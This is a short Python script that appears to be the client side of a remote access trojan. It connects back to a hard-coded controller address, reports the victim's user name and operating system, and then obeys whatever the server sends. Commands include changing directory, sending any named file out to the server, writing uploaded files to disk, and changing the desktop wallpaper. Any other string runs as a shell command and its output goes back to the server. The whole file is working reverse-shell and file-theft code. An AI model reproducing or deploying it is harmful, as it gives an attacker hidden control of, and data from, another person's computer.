from socket import *
import os
from getpass import getuser
import subprocess
import platform
import ctypes
from time import sleep
from sqlite3 import connect 


get_os = platform.uname()[0]
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os: "+str(get_os)

#1
host = "127.0.0.1"
port = 8080
buferrsize = 1024
#2
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

#3
s.send(os_info.encode())

while True:
	recever = s.recv(buferrsize).decode()

	if recever == "exit":
		exit()
	elif recever[:2] == "cd":
		os.chdir(recever[3:])
		s.send(os.getcwd().encode())



	elif recever == "chbackg":
		ctypes.windl.user32.SystemParametersInfoW(20, 0, "/home/besthacking1/Vidéos/video", 0)
	elif recever[:4] == "down":
		file = recever[5:]
		file = open(file, "rb")
		data = file.read()
		file.close()

		while True:
			if len(data) > 0:
				temp_data = data[:buferrsize]
				if len(temp_data) < buferrsize:
					temp_data += chr(0).encode() * (buferrsize - len(temp_data))

				data = data[buferrsize:]

				s.send(temp_data)
			else:
				s.send("Ended".encode())
				sleep(0.5)
				break
		s.send("[*]Download True ;)".encode())

	elif recever[:2] == "up":
		cmd_list = recever.split(" ")

		data = b""
		while True:
			end_data = s.recv(buferrsize)

			if end_data == b"Ended":
				break
			data += end_data

		new_file = open(cmd_list[2], "wb")
		new_file.write(data)
		new_file.close()

		s.send(" Upload True :)".encode())
	
	else:

		out_put = subprocess.getoutput(recever)

		if out_put == "" or out_put == None:
			out_put = "error"
			s.send(out_put.encode())
		else:
			s.send(out_put.encode())
#4
s.close()